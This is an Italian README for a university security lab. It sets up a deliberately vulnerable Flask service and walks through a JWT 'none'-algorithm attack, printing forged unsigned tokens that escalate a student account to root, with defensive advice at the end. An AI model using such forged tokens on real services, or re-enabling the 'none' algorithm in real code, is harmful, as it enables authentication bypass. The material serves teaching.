# JWT_none_attack

Progetto di sicurezza - Anno accademico 2019/2020

Componente software in grado simulare un attacco di tipo None algorithm su Token JWT

## Creazione dell'environment per l'installazione del progetto

- Il primo step prevede l'installazione di [Python](https://www.python.org/) e di [Virtualenv](https://virtualenv.pypa.io/en/latest/installation.html) disponibile per i principali sistemi operativi. Virtualenv permette di creare ambienti python virtuali senza alterare le installazioni presenti sul sistema operativo principale

- Una volta installato Virtualenv si può procedere all'attivazione dell'ambiente e all'installazione delle componenti necessarie

```
# Si crea una directory per il progetto
$ mkdir jwt
$ cd jwt

# Si crea un ambiente denominato jwt_none
$ virtualenv -p python3 jwt_none
$ source jwt_none/bin/activate
```

- Lo step successivo è quello che prevende l'installazione dei pacchetti necessari al funzionamento del codice. Nello specifico il software qui implementato fa uso di alcune routine della libreria jwt nella quale è stato riabilitato l'uso dell'algoritmo "None" per replicare l'attacco e del framework Flask per la creazione di endpoint REST.

```
# Si installano i pacchetti necessari alla creazione degli endpoint
(jwt_none) $ pip install flask flask-restful flask-jwt-extended pylint-flask
(jwt_none) $ pip install jwt
```

- Se si vuole lavorare su un db locale (nel nostro caso SQLLite) è necessario installare flask_sqlalchemy che è in grado di gestire sia db locali che db su server remoti

```
# Installazione della librearia
(jwt_none) $ pip install flask_sqlalchemy
```

- Copiare i file presenti nella directory _libreria_ del progetto all'interno nella directory creata da pip jwt_none/lib/python3.7/site-packages/jwt

- Per lanciare il server è necessario eseguire questo comando

```
(jwt_none) $ FLASK_APP=start.py FLASK_DEBUG=1 flask run
```

## Installazione con Docker

In alternativa, è possibile utilizzare Docker per eseguire il progetto

- Il primo step prevede la creazione di un'immagine Docker

```
# Si scarica il progetto in una directory locale
$ git clone https://github.com/nicolanoviello/JWT_none_attack.git
# Si accede alla directory del progetto appena scaricato
$ cd JWT_none_attack/
# Si crea l'immagine Docker
$ docker build -t jwt-none-docker .
```

- Il secondo step prevede l'esecuzione dell'immagine Docker appena creata

```
$ docker run -d  --name jwt-none-container jwt-none-docker:latest
```

## Funzionamento del progetto

Il software implementato provvede ad esporre su _localhost_, sulla porta 3000, quattro servizi:

- _/registration_
  - attraverso una chiamata di tipo _POST_ con un JSON contenente _username_, _password_, _ruolo_ (non obbligatorio) verrà creato e salvato sul DB un utente in grado di effettuare una login con la coppia di credenziali _username/password_
  ```
  {
  "username":"username dell'utente",
  "password":"password dell'utente",
  "ruolo":"ruolo dell'utente"
  }
  ```
  - nel caso venga omesso il _ruolo_, l'utente sarà registrato come **studente**, gli altri ruoli possibili sono **root** e **abcde**. **root** è un utente creato di proposito per evitare che un attaccante in grado di sfruttare la vulnerabilità possa essere in grado di trovare in maniera esplicita il ruolo in grado di "catturare la bandiera", il secondo invece è il ruolo che ci permette di raggiungere il nostro target
- _/login_
  - attraverso una chiamata di tipo _POST_ con un JSON contenente _username_ è _password_ valide, tra quelle registrate nel DB, l'utente sarà in grado di effettuare una Login e ricevere un Token JWT da usare per la chiamata _/scopriruolo_
  ```
  {
  "username":"username dell'utente",
  "password":"password dell'utente"
  }
  ```
- _/users_
  - attraverso una chiamata di tipo _GET_ il sistema restituirà la lista degli utenti registrati sul sistema
  - attraverso una chiamata di tipo _DELETE_ il sistema eliminerà tutti gli utenti presenti sul DB
- _/scopriruolo_
  - attraverso una chiamata di tipo _GET_ inserendo il JWT ricevuto dalla chiamata di login all'interno dell'Authorization Header il software controllerà il ruolo dell'utente e, nel caso si riesca a catturare la bandiera, restituirà il messaggio _"Sei ufficialmente root"_

## Esecuzione dell'attacco

**1) Per procedere all'attacco eseguiamo il server e provvediamo a registrare un account di tipo _studente_. Chiamiamo quindi l'endpoint _/registration_ con le credenziali scelte**

```
 {
 "username":"studente_semplice",
 "password":"test"
 }
```

Il sistema verificherà la correttezza del JSON e risponderà in questo modo

```
{
  "username": "studente_semplice",
  "password": "test",
  "ruolo": null
}
```

**2) Effettuiamo la login con le credenziali scelte chiamando l'endpoint _/login_ **

Se le credenziali sono corrette il server risponderà in questo modo

```
{
  "message": "Hai effettuato l'accesso come studente_semplice",
  "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSJ9.MerWIMtpam34E_oVk5vos7i1XsgHhJDGxqe2yxo2r40"
}
```

Il valore della chiave _auth_token_ è il nostro JWT

**3) Proviamo a chiamare l'endpoint _/scopriruolo_ con il JWT ricevuto e verifichiamo la risposta**

```
{
   "message": "Benvenuto studente!"
 }
```

Come si evince, senza alcuna modifica non siamo in grado di _catturare la bandiera_

**4) Andiamo ad analizzare il JWT appena ricevuto**

La prima parte del JWT è quella che riguarda l'Header, dove viene specificato l'algoritmo di codifica

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

Decodificando questa parte otteniamo questo JSON

```
{
 "typ": "JWT",
 "alg": "HS256"
 }
```

Come si può notare, nella chiave _alg_ è chiaramente specificato l'algoritmo di codifica _HS256_

Procediamo quindi ad analizzare la seconda parte del JWT, quella che contiene il payload

```
eyJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSJ9
```

Decodificando questa parte otteniamo questo JSON

```
{
 "username": "studente_semplice"
 }
```

Di fatto dovremmo modificare il payload per provare ad ottenere la bandiera

La terza parte del JWT contiene una firma con una chiave _segreta_ di entrambi i due blocchi qui sopra descritti. Ne va di conseguenza che se provassimo a modificare solo il payload, lasciando inalterata la firma, il sistema non sarebbe in grado di verificare la correttezza del Token.

Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON

```
{
 "username": "studente_semplice",
"ruolo":"root"
}
```

Che codificato risulta essere

```
ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9
```

Il nuovo JWT sarà quindi

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.MerWIMtpam34E_oVk5vos7i1XsgHhJDGxqe2yxo2r40
```

Se proviamo a chiamare l'endpoint _/scopriruolo_ con questo JWT il server non sarà in grado di verificare la firma e restituirà un errore di tipo _JWTDecodeError_

**5) L'attacco**

L'header del JWT indica al server _come_ verificare la firma del Token appena inviato. Inserendo quindi all'interno dell'header un algoritmo diverso si può "ingannare" il server e forzare a verificare la firma con l'algoritmo indicato.
Inserendo il valore _none_ nella chiave _alg_ dell'header ed escludendo la terza parte del JWT, quella relativa alla firma (poiché di fatto l'algoritmo _none_ non effettua nessuna firma) si può provare ad ingannare il server.

Proviamo quindi a cambiare la stringa relativa all'Header con un nuovo JSON

```
{
 "typ": "JWT",
 "alg": "none"
}
```

Che codificato risulta essere

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0
```

Eliminiamo la terza parte, quella relativa alla firma (lasciando però il .), il nuovo JWT sarà quindi

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJyb290Igp9.
```

Se proviamo a chiamare l'endpoint _/scopriruolo_ con questo JWT il server risponderà in questo modo

```
{
   "message": "Mi dispiace per te ma sei un fake root"
 }
```

Questo perché nel codice è stato inserito un controllo per evitare che il ruolo possa essere scritto _in chiaro_. Cambiando ancora una volta il Payload ed usando il ruolo _codificato_ _abcde_ possiamo finalmente _catturare la bandiera_
Proviamo però a cambiare la stringa relativa al Payload con un nuovo JSON

```
{
 "username": "studente_semplice",
"ruolo":"abcde"
}
```

Che codificato risulta essere

```
ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ
```

Il nuovo JWT sarà quindi

```
ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJzdHVkZW50ZV9zZW1wbGljZSIsCiAicnVvbG8iOiJhYmNkZSIKfQ.
```

Se proviamo a chiamare l'endpoint _/scopriruolo_ con questo JWT il server risponderà in questo modo

```
{
   "message": "Sei ufficialmente root"
}
```

## Conclusioni

Nelle buone pratiche di JWT è richiesta sempre una verifica riguardante i campi dell'Header e del Payload, specialmente se riguardano aspetti legati alla sicurezza delle informazioni. Inoltre l'utilizzo di chiavi nel Payload eccessivamente "parlanti" può agevolare un ipotetico attaccante nell'individuazione di chiavi critiche per la sicurezza. È buona norma blindare le librerie e vincolarne l'uso esclusivamente al caso d'uso che si vuole applicare.
